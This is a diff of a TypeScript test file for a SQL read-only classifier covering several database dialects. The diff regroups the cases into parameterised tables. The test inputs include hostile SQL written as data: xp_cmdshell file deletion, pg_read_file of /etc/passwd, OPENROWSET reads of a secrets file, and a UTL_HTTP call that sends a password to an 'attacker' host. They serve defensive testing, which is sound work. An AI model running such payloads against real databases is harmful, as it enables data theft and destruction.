@@ -1,13 +1,9 @@
 import { describe, it, expect } from "vitest";
 import { isReadOnlySQL } from "../allowed-keywords.js";
-import { splitSQLStatements } from "../sql-parser.js";
-import type { ConnectorType } from "../../connectors/interface.js";
 
-// Mirrors areAllStatementsReadOnly in src/tools/execute-sql.ts: the real
-// enforcement splits a batch into statements first, then checks each one.
-function areAllStatementsReadOnly(sql: string, connectorType: ConnectorType): boolean {
-  return splitSQLStatements(sql, connectorType).every(s => isReadOnlySQL(s, connectorType));
-}
+// Multi-statement behaviour (split, then classify each statement) lives in
+// src/utils/sql-access-policy.ts and is tested in sql-access-policy.test.ts.
+// Everything here is single-statement classification.
 
 describe("isReadOnlySQL", () => {
   describe("basic read-only detection", () => {
@@ -23,25 +19,16 @@ describe("isReadOnlySQL", () => {
       expect(isReadOnlySQL("EXPLAIN SELECT * FROM users", "postgres")).toBe(true);
     });
 
-    it("should identify INSERT as not read-only", () => {
-      expect(isReadOnlySQL("INSERT INTO users VALUES (1)", "postgres")).toBe(false);
-    });
-
-    it("should identify UPDATE as not read-only", () => {
-      expect(isReadOnlySQL("UPDATE users SET name = 'test'", "postgres")).toBe(false);
-    });
-
-    it("should identify DELETE as not read-only", () => {
-      expect(isReadOnlySQL("DELETE FROM users", "postgres")).toBe(false);
+    it.each([
+      ["INSERT", "INSERT INTO users VALUES (1)"],
+      ["UPDATE", "UPDATE users SET name = 'test'"],
+      ["DELETE", "DELETE FROM users"],
+    ])("should identify %s as not read-only", (_keyword, sql) => {
+      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
     });
   });
 
   describe("comment handling", () => {
-    it("should detect read-only after stripping single-line comment", () => {
-      const sql = "-- this is a comment\nSELECT * FROM users";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
-    });
-
     it("should detect read-only after stripping multi-line comment", () => {
       const sql = "/* INSERT */ SELECT * FROM users";
       expect(isReadOnlySQL(sql, "postgres")).toBe(true);
@@ -80,69 +67,25 @@ describe("isReadOnlySQL", () => {
       expect(isReadOnlySQL("ANALYZE", "mysql")).toBe(false);
     });
 
-    it("should allow REPLACE() as a function in MySQL SELECT", () => {
-      expect(isReadOnlySQL("SELECT REPLACE(name, 'a', 'b') FROM users", "mysql")).toBe(true);
-    });
-
     it("should allow REPLACE() inside a WITH CTE in MySQL", () => {
+      // MySQL's mutating pattern knows REPLACE INTO; a REPLACE() call must not match it.
       const sql = "WITH cte AS (SELECT REPLACE(name, 'a', 'b') AS cleaned FROM users) SELECT * FROM cte";
       expect(isReadOnlySQL(sql, "mysql")).toBe(true);
     });
   });
 
   describe("CTE with mutating operations", () => {
-    it("should reject UPDATE inside a CTE", () => {
-      const sql = "WITH updated AS (UPDATE contracts SET site_location_postcode = 'SW11' WHERE id = 1 RETURNING id) SELECT * FROM updated";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
-    });
-
-    it("should reject DELETE inside a CTE", () => {
-      const sql = "WITH deleted AS (DELETE FROM users WHERE id = 1 RETURNING *) SELECT * FROM deleted";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
-    });
-
-    it("should reject INSERT inside a CTE", () => {
-      const sql = "WITH inserted AS (INSERT INTO users (name) VALUES ('test') RETURNING *) SELECT * FROM inserted";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(false);
-    });
-
-    it("should allow a pure SELECT CTE", () => {
-      const sql = "WITH cte AS (SELECT * FROM users) SELECT * FROM cte";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
-    });
-
-    it("should reject DROP inside a CTE-like construct", () => {
-      const sql = "WITH x AS (SELECT 1) DROP TABLE users";
+    it.each([
+      ["UPDATE", "WITH updated AS (UPDATE contracts SET site_location_postcode = 'SW11' WHERE id = 1 RETURNING id) SELECT * FROM updated"],
+      ["DELETE", "WITH deleted AS (DELETE FROM users WHERE id = 1 RETURNING *) SELECT * FROM deleted"],
+      ["INSERT", "WITH inserted AS (INSERT INTO users (name) VALUES ('test') RETURNING *) SELECT * FROM inserted"],
+      ["DROP (CTE-like construct)", "WITH x AS (SELECT 1) DROP TABLE users"],
+    ])("should reject %s inside a CTE", (_keyword, sql) => {
       expect(isReadOnlySQL(sql, "postgres")).toBe(false);
     });
 
     it("should not be fooled by mutating keywords in string literals", () => {
-      const sql = "SELECT * FROM users WHERE name = 'UPDATE me'";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
-    });
-
-    it("should not be fooled by mutating keywords in comments", () => {
-      const sql = "/* UPDATE users SET x = 1 */ SELECT * FROM users";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
-    });
-
-    it("should allow REPLACE() as a string function in SELECT", () => {
-      const sql = "SELECT REPLACE(name, 'a', 'b') FROM users";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
-    });
-
-    it("should allow REPLACE() as a string function inside a WITH CTE", () => {
-      const sql = "WITH cte AS (SELECT REPLACE(name, 'a', 'b') AS name FROM users) SELECT * FROM cte";
-      expect(isReadOnlySQL(sql, "postgres")).toBe(true);
-    });
-
-    it("should reject REPLACE INTO as a mutating statement", () => {
-      const sql = "REPLACE INTO users (id, name) VALUES (1, 'test')";
-      expect(isReadOnlySQL(sql, "mysql")).toBe(false);
-    });
-
-    it("should allow a CTE named 'replace' in Postgres", () => {
-      const sql = "WITH replace AS (SELECT 1) SELECT * FROM replace";
+      const sql = "WITH cte AS (SELECT 'UPDATE me' AS note) SELECT * FROM cte";
       expect(isReadOnlySQL(sql, "postgres")).toBe(true);
     });
 
@@ -151,15 +94,13 @@ describe("isReadOnlySQL", () => {
       expect(isReadOnlySQL(sql, "mysql")).toBe(true);
     });
 
-    it("should reject REPLACE (non-function) inside WITH in MySQL", () => {
-      const sql = "WITH cte AS (SELECT 1) REPLACE INTO users VALUES (1, 'test')";
-      expect(isReadOnlySQL(sql, "mysql")).toBe(false);
-    });
-
-    it("should reject REPLACE (non-function) inside WITH in SQLite", () => {
-      const sql = "WITH cte AS (SELECT 1) REPLACE INTO users VALUES (1, 'test')";
-      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
-    });
+    it.each(["mysql", "sqlite"] as const)(
+      "should reject REPLACE INTO (non-function) inside WITH in %s",
+      (dialect) => {
+        const sql = "WITH cte AS (SELECT 1) REPLACE INTO users VALUES (1, 'test')";
+        expect(isReadOnlySQL(sql, dialect)).toBe(false);
+      }
+    );
 
     it("should reject WITH ... SELECT INTO", () => {
       const sql = "WITH cte AS (SELECT * FROM users) SELECT * INTO new_table FROM cte";
@@ -205,26 +146,21 @@ describe("isReadOnlySQL", () => {
       expect(isReadOnlySQL("EXPLAIN ANALYZE VERBOSE DELETE FROM users", "postgres")).toBe(false);
     });
 
-    it("should allow EXPLAIN (ANALYZE false) with DML (not executed)", () => {
-      expect(isReadOnlySQL("EXPLAIN (ANALYZE false) DELETE FROM users", "postgres")).toBe(true);
-    });
-
-    it("should allow EXPLAIN (ANALYZE off) with DML (not executed)", () => {
-      expect(isReadOnlySQL("EXPLAIN (ANALYZE off) DELETE FROM users", "postgres")).toBe(true);
-    });
+    it.each(["false", "off"])(
+      "should allow EXPLAIN (ANALYZE %s) with DML (not executed)",
+      (value) => {
+        expect(isReadOnlySQL(`EXPLAIN (ANALYZE ${value}) DELETE FROM users`, "postgres")).toBe(true);
+      }
+    );
   });
 
   describe("SELECT INTO", () => {
-    it("should reject SELECT INTO (Postgres table creation)", () => {
-      expect(isReadOnlySQL("SELECT * INTO new_table FROM users", "postgres")).toBe(false);
-    });
-
-    it("should reject SELECT INTO OUTFILE (MySQL)", () => {
-      expect(isReadOnlySQL("SELECT * INTO OUTFILE '/tmp/data.csv' FROM users", "mysql")).toBe(false);
-    });
-
-    it("should reject SELECT INTO with WHERE clause", () => {
-      expect(isReadOnlySQL("SELECT id, name INTO backup_table FROM users WHERE active = true", "sqlserver")).toBe(false);
+    it.each([
+      ["SELECT INTO (Postgres table creation)", "SELECT * INTO new_table FROM users", "postgres"],
+      ["SELECT INTO OUTFILE (MySQL)", "SELECT * INTO OUTFILE '/tmp/data.csv' FROM users", "mysql"],
+      ["SELECT INTO with WHERE clause", "SELECT id, name INTO backup_table FROM users WHERE active = true", "sqlserver"],
+    ] as const)("should reject %s", (_label, sql, dialect) => {
+      expect(isReadOnlySQL(sql, dialect)).toBe(false);
     });
   });
 
@@ -265,102 +201,37 @@ describe("isReadOnlySQL", () => {
   });
 
   describe("SQL Server dynamic SQL bypass prevention", () => {
-    it("should reject EXEC as a standalone statement", () => {
-      expect(isReadOnlySQL("EXEC('DELETE FROM users')", "sqlserver")).toBe(false);
+    it.each([
+      ["EXEC", "EXEC('DELETE FROM users')"],
+      ["EXECUTE", "EXECUTE('DELETE FROM users')"],
+      ["EXEC sp_executesql", "EXEC sp_executesql N'DELETE FROM users'"],
+    ])("should reject %s as a standalone statement", (_label, sql) => {
+      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
     });
 
-    it("should reject EXECUTE as a standalone statement", () => {
-      expect(isReadOnlySQL("EXECUTE('DELETE FROM users')", "sqlserver")).toBe(false);
-    });
-
-    it("should reject EXEC sp_executesql", () => {
-      expect(isReadOnlySQL("EXEC sp_executesql N'DELETE FROM users'", "sqlserver")).toBe(false);
-    });
-
-    it("should reject EXEC inside a CTE", () => {
-      expect(isReadOnlySQL("WITH cte AS (SELECT 1) EXEC('DELETE FROM users')", "sqlserver")).toBe(false);
-    });
-
-    it("should reject EXECUTE inside a CTE", () => {
-      expect(isReadOnlySQL("WITH cte AS (SELECT 1) EXECUTE('DELETE FROM users')", "sqlserver")).toBe(false);
-    });
-
-    it("should reject implicit sp_executesql (no EXEC prefix) inside a CTE", () => {
-      expect(isReadOnlySQL("WITH cte AS (SELECT 1) sp_executesql N'DELETE FROM users'", "sqlserver")).toBe(false);
-    });
-
-    it("should reject xp_cmdshell inside a CTE", () => {
-      expect(isReadOnlySQL("WITH cte AS (SELECT 1) xp_cmdshell 'del *.*'", "sqlserver")).toBe(false);
+    it.each([
+      ["EXEC", "WITH cte AS (SELECT 1) EXEC('DELETE FROM users')"],
+      ["EXECUTE", "WITH cte AS (SELECT 1) EXECUTE('DELETE FROM users')"],
+      ["implicit sp_executesql (no EXEC prefix)", "WITH cte AS (SELECT 1) sp_executesql N'DELETE FROM users'"],
+      ["xp_cmdshell", "WITH cte AS (SELECT 1) xp_cmdshell 'del *.*'"],
+    ])("should reject %s inside a CTE", (_label, sql) => {
+      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
     });
 
     it("should not reject EXEC/EXECUTE inside string literals", () => {
       expect(isReadOnlySQL("SELECT * FROM users WHERE name = 'EXEC is a keyword'", "sqlserver")).toBe(true);
     });
-
-    it("should not reject EXEC/EXECUTE in comments", () => {
-      expect(isReadOnlySQL("/* EXEC('DROP TABLE users') */ SELECT 1", "sqlserver")).toBe(true);
-    });
-
-    it("should reject EXEC after multi-statement split", () => {
-      expect(areAllStatementsReadOnly("SELECT 1; EXEC('DELETE FROM users')", "sqlserver")).toBe(false);
-    });
   });
 
   describe("SQL Server pass-through data source bypass prevention", () => {
-    it("should reject OPENQUERY, whose payload runs on the remote server", () => {
-      expect(
-        isReadOnlySQL("SELECT * FROM OPENQUERY(linked_srv, 'DELETE FROM customers')", "sqlserver")
-      ).toBe(false);
-    });
-
-    it("should reject OPENROWSET bulk file reads", () => {
-      expect(
-        isReadOnlySQL("SELECT * FROM OPENROWSET(BULK N'C:\\secrets\\config.ini', SINGLE_CLOB) AS x", "sqlserver")
-      ).toBe(false);
-    });
-
-    it("should reject OPENDATASOURCE ad-hoc connections", () => {
-      expect(
-        isReadOnlySQL(
-          "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=evil;Trusted_Connection=yes').db.dbo.t",
-          "sqlserver"
-        )
-      ).toBe(false);
-    });
-
-    it("should reject OPENQUERY nested inside a CTE", () => {
-      expect(
-        isReadOnlySQL(
-          "WITH cte AS (SELECT * FROM OPENQUERY(srv, 'DROP TABLE t')) SELECT * FROM cte",
-          "sqlserver"
-        )
-      ).toBe(false);
-    });
-
-    it("should reject OPENQUERY after multi-statement split", () => {
-      expect(
-        areAllStatementsReadOnly("SELECT 1; SELECT * FROM OPENQUERY(srv, 'DELETE FROM t')", "sqlserver")
-      ).toBe(false);
-    });
-
-    it("should not reject the word openquery inside a string literal", () => {
-      expect(isReadOnlySQL("SELECT * FROM logs WHERE note = 'openquery(x)'", "sqlserver")).toBe(true);
-    });
-
-    it("should not reject the word openrowset in a comment", () => {
-      expect(isReadOnlySQL("/* OPENROWSET(BULK 'x') */ SELECT 1", "sqlserver")).toBe(true);
-    });
-
+    // The call-position rejection of OPENQUERY/OPENROWSET/OPENDATASOURCE is
+    // covered by the escape-hatch table below; these pin the non-call forms.
     it("should not reject identifiers that merely start with a pass-through name", () => {
       expect(isReadOnlySQL("SELECT openquery_audit FROM logs", "sqlserver")).toBe(true);
     });
 
     it("should not reject a bare column named openquery (no call syntax)", () => {
       expect(isReadOnlySQL("SELECT openquery FROM logs", "sqlserver")).toBe(true);
-    });
-
-    it("should leave other dialects unaffected", () => {
-      expect(isReadOnlySQL("SELECT * FROM openquery(a, b)", "postgres")).toBe(true);
     });
   });
 
@@ -376,16 +247,13 @@ describe("isReadOnlySQL", () => {
   });
 
   describe("MySQL conditional comment bypass prevention", () => {
-    it("should reject MySQL conditional comment containing DELETE", () => {
-      expect(isReadOnlySQL("/*!50000 DELETE FROM users WHERE 1=1 */", "mysql")).toBe(false);
-    });
-
-    it("should reject MySQL conditional comment containing DROP", () => {
-      expect(isReadOnlySQL("/*!50000 DROP TABLE users */", "mysql")).toBe(false);
-    });
-
-    it("should reject MariaDB conditional comment containing DELETE", () => {
-      expect(isReadOnlySQL("/*!50000 DELETE FROM users */", "mariadb")).toBe(false);
+    // The scanner's handling of executable comments is pinned in
+    // sql-parser.test.ts; these pin the classifier's verdict on them.
+    it.each([
+      ["mysql", "/*!50000 DELETE FROM users WHERE 1=1 */"],
+      ["mariadb", "/*M! DELETE FROM users */"],
+    ] as const)("should reject %s executable comment containing DELETE: %s", (dialect, sql) => {
+      expect(isReadOnlySQL(sql, dialect)).toBe(false);
     });
 
     it("should reject even SELECT inside MySQL conditional comment (safe default)", () => {
@@ -397,18 +265,6 @@ describe("isReadOnlySQL", () => {
     it("should still strip regular comments for MySQL", () => {
       expect(isReadOnlySQL("/* comment */ SELECT 1", "mysql")).toBe(true);
     });
-
-    it("should reject conditional comment without version number", () => {
-      expect(isReadOnlySQL("/*! DELETE FROM users */", "mysql")).toBe(false);
-    });
-
-    it("should reject MariaDB M-bang executable comment", () => {
-      expect(isReadOnlySQL("/*M! DELETE FROM users */", "mariadb")).toBe(false);
-    });
-
-    it("should reject MariaDB M-bang executable comment on MySQL dialect", () => {
-      expect(isReadOnlySQL("/*M! DROP TABLE users */", "mysql")).toBe(false);
-    });
   });
 
   describe("SQLite PRAGMA write bypass prevention", () => {
@@ -417,63 +273,28 @@ describe("isReadOnlySQL", () => {
       expect(isReadOnlySQL("PRAGMA journal_mode", "sqlite")).toBe(true);
     });
 
-    it("should reject assignment-form pragma writing the database header", () => {
-      expect(isReadOnlySQL("PRAGMA user_version = 1337", "sqlite")).toBe(false);
-      expect(isReadOnlySQL("PRAGMA application_id = 1", "sqlite")).toBe(false);
+    it.each([
+      ["writing the database header", "PRAGMA user_version = 1337"],
+      ["changing durable state", "PRAGMA journal_mode = WAL"],
+      ["disabling the read-only backstop", "PRAGMA query_only = OFF"],
+      ["without surrounding spaces", "PRAGMA user_version=1"],
+    ])("should reject assignment-form pragma %s", (_label, sql) => {
+      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
     });
 
-    it("should reject assignment-form pragma changing durable state", () => {
-      expect(isReadOnlySQL("PRAGMA journal_mode = WAL", "sqlite")).toBe(false);
-      expect(isReadOnlySQL("PRAGMA foreign_keys = OFF", "sqlite")).toBe(false);
-      expect(isReadOnlySQL("PRAGMA secure_delete = ON", "sqlite")).toBe(false);
-    });
-
-    it("should reject assignment-form pragma disabling the read-only backstop", () => {
-      expect(isReadOnlySQL("PRAGMA query_only = OFF", "sqlite")).toBe(false);
-      expect(isReadOnlySQL("PRAGMA writable_schema = ON", "sqlite")).toBe(false);
-    });
-
-    it("should reject assignment-form pragma without surrounding spaces", () => {
-      expect(isReadOnlySQL("PRAGMA user_version=1", "sqlite")).toBe(false);
-    });
-
-    it("should reject the parenthesized setter form (equivalent to '= value')", () => {
+    it.each([
+      ["writing the database header", "PRAGMA user_version(1337)"],
+      ["changing durable state", "PRAGMA journal_mode(wal)"],
+      ["disabling the read-only backstop", "PRAGMA query_only(0)"],
+    ])("should reject the parenthesized setter form (equivalent to '= value') %s", (_label, sql) => {
       // SQLite accepts `PRAGMA name(value)` as an alias for `PRAGMA name = value`.
-      expect(isReadOnlySQL("PRAGMA user_version(1337)", "sqlite")).toBe(false);
-      expect(isReadOnlySQL("PRAGMA journal_mode(wal)", "sqlite")).toBe(false);
-      expect(isReadOnlySQL("PRAGMA writable_schema(1)", "sqlite")).toBe(false);
-    });
-
-    it("should reject disabling the backstop via the parenthesized form", () => {
-      expect(isReadOnlySQL("PRAGMA query_only(0)", "sqlite")).toBe(false);
-      expect(isReadOnlySQL("PRAGMA query_only(OFF)", "sqlite")).toBe(false);
+      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
     });
 
     it("should still allow introspection pragmas that take a name argument", () => {
       expect(isReadOnlySQL("PRAGMA table_info(users)", "sqlite")).toBe(true);
       expect(isReadOnlySQL("PRAGMA index_list(users)", "sqlite")).toBe(true);
       expect(isReadOnlySQL("PRAGMA foreign_key_list(orders)", "sqlite")).toBe(true);
-    });
-  });
-
-  describe("MySQL/MariaDB -- comment bypass prevention", () => {
-    // MySQL/MariaDB only treat "--" as a comment when followed by whitespace.
-    // "SELECT 1--1;DROP TABLE t" is one statement to a naive parser but two to
-    // the engine, so after splitting the hidden DROP must be checked and rejected.
-    it("should split and reject a DROP hidden after -- without whitespace (mysql)", () => {
-      expect(areAllStatementsReadOnly("SELECT 1--1;DROP TABLE victim", "mysql")).toBe(false);
-    });
-
-    it("should split and reject a DROP hidden after -- without whitespace (mariadb)", () => {
-      expect(areAllStatementsReadOnly("SELECT 1--1;DROP TABLE victim", "mariadb")).toBe(false);
-    });
-
-    it("should still treat '-- ' followed by whitespace as a comment (mysql)", () => {
-      expect(areAllStatementsReadOnly("SELECT 1 -- a comment", "mysql")).toBe(true);
-    });
-
-    it("should still treat the DML-in-comment as inert for postgres (-- is always a comment)", () => {
-      expect(areAllStatementsReadOnly("SELECT 1--1;DROP TABLE victim", "postgres")).toBe(true);
     });
   });
 
@@ -490,9 +311,13 @@ describe("isReadOnlySQL", () => {
       ["postgres", "SELECT pg_read_file('/etc/passwd')"],
       ["postgres", "SELECT pg_read_binary_file('server.key')"],
       ["postgres", "SELECT pg_ls_dir('/var/lib/postgresql')"],
-      // SQL Server pass-through sources share the same call-position guard.
-      ["sqlserver", "SELECT * FROM OPENQUERY(lnk, 'SELECT 1')"],
-      ["sqlserver", "SELECT * FROM OPENROWSET('SQLNCLI', 'x', 'SELECT 1')"],
+      // SQL Server pass-through sources share the same call-position guard:
+      // OPENQUERY's payload runs on the remote server, OPENROWSET(BULK) reads
+      // server-side files, OPENDATASOURCE opens ad-hoc connections.
+      ["sqlserver", "SELECT * FROM OPENQUERY(lnk, 'DELETE FROM customers')"],
+      ["sqlserver", "SELECT * FROM OPENROWSET(BULK N'C:\\secrets\\config.ini', SINGLE_CLOB) AS x"],
+      ["sqlserver", "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=evil;Trusted_Connection=yes').db.dbo.t"],
+      ["sqlserver", "WITH cte AS (SELECT * FROM OPENQUERY(srv, 'DROP TABLE t')) SELECT * FROM cte"],
       // Oracle packages reachable from a SELECT: network/filesystem access
       // and arbitrary code execution, matched on the package prefix.
       ["oracle", "SELECT UTL_HTTP.REQUEST('http://attacker/' || (SELECT password FROM t)) FROM dual"],
@@ -526,6 +351,8 @@ describe("isReadOnlySQL", () => {
       expect(isReadOnlySQL("SELECT pg_read_file FROM t", "mysql")).toBe(true);
       // load_file is MySQL's; a postgres column of that name is fine.
       expect(isReadOnlySQL("SELECT load_file FROM t", "postgres")).toBe(true);
+      // openquery is SQL Server's; a postgres call of that name is fine.
+      expect(isReadOnlySQL("SELECT * FROM openquery(a, b)", "postgres")).toBe(true);
     });
   });
 });
